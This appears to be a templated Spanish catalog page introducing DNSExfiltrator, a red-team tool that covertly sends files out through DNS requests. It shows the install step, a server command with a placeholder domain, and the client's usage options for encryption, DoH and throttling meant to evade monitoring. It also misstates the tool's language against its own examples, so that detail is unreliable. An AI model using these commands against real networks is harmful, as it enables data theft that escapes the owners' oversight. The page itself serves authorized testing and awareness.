---
title: "DNSExfiltrator: exfiltración por canales que nadie vigila"
slug: "dnsexfiltrator"
summary: "DNSExfiltrator: exfiltración de datos por canales encubiertos."
category: "ciberseguridad"
level: "Intermedio"
reading: 7
tags: ["exfiltración", "red-team", "ciberseguridad"]
updated: "2026-11-01"
featured: false
order: 999
---

## Qué es DNSExfiltrator

**DNSExfiltrator** es una herramienta de código abierto orientada a operaciones de red team y adversary simulation. La exfiltración extrae la información sin activar los controles de salida. El reto es hacerlo por canales legítimos y a un ritmo que no alarme.

> Descripción oficial: Data exfiltration over DNS request covert channel

## Para qué sirve

DNSExfiltrator se utiliza en la fase de **exfiltración**. Su función es automatizar o simplificar una tarea técnica que, hecha a mano, consumiría tiempo y aumentaría el riesgo de errores.

En la práctica, permite al operador centrarse en la estrategia y en la interpretación de los resultados, no en repetir comandos.

## Instalación

```bash
pip install -r requirements.txt
```

> Revisa el README oficial para dependencias específicas, versiones y notas de compilación.

## Uso básico

```bash
root@kali:~# ./dnsexfiltrator.py -d mydomain.com -p password
```

```bash
dnsExfiltrator.exe <file> <domainName> <password> [-b32] [h=google|cloudflare] [s=<DNS_server>] [t=<throttleTime>] [r=<requestMaxSize>] [l=<labelMaxSize>]
      file:           [MANDATORY] The file name to the file to be exfiltrated.
      domainName:     [MANDATORY] The domain name to use for DNS requests.
      password:       [MANDATORY] Password used to encrypt the data to be exfiltrated.
      -b32:           [OPTIONNAL] Use base32 encoding of data. Might be required by some DNS resolver break case.
      h:              [OPTIONNAL] Use Google or CloudFlare DoH (DNS over HTTP) servers.
      DNS_Server:     [OPTIONNAL] The DNS server name or IP to use for DNS requests. Defaults to the system one.
      throttleTime:   [OPTIONNAL] The time in milliseconds to wait between each DNS request.
      requestMaxSize: [OPTIONNAL] The maximum size in bytes for each DNS request. Defaults to 255 bytes..
      labelMaxSize:   [OPTIONNAL] The maximum size in chars for each DNS request label (subdomain). Defaults to 63 chars.
```

## Compatibilidad y requisitos

- **Lenguaje principal:** JavaScript
- **Última actualización del repositorio:** 2024-04-29
- **Estrellas en GitHub:** 885
- **Termux:** sí, con matices

**Compatible con Termux (con matices).** Si el proyecto es Python, Go, Rust o Bash, puedes clonarlo en Termux e instalar sus dependencias. Algunas funciones que dependen de la red, del almacenamiento o de permisos del sistema pueden requerir un entorno Linux completo.

## Ética y alcance

Usa DNSExfiltrator únicamente en sistemas propios o con autorización escrita. El uso no autorizado es ilegal. En laboratorio, aísla la red, documenta cada paso y respeta el alcance acordado.

## Referencias

- Repositorio oficial: https://github.com/Arno0x/DNSExfiltrator
- Toolkit de origen: Red Teaming Toolkit
